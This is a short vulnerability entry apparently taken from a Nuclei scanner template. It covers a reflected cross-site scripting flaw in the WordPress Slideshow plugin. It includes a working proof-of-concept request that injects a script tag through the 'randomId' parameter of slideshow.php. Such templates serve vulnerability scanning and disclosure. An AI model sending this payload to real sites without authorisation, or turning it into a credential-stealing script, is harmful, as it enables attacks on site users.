# Nuclei Template: WordPress Slideshow - Cross-Site Scripting
**Template ID:** wp-slideshow-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`wp-slideshow-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Slideshow plugin contains multiple cross-site scripting vulnerabilities. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Steps to reproduce / Exploit Payload
```http
GET /wp-content/plugins/slideshow-jquery-image-gallery/readme.txt HTTP/1.1
Host: {{Hostname}}

GET {{BaseURL}}/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPlugin/slideshow.php?randomId=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

## References
- https://www.exploit-db.com/exploits/37948
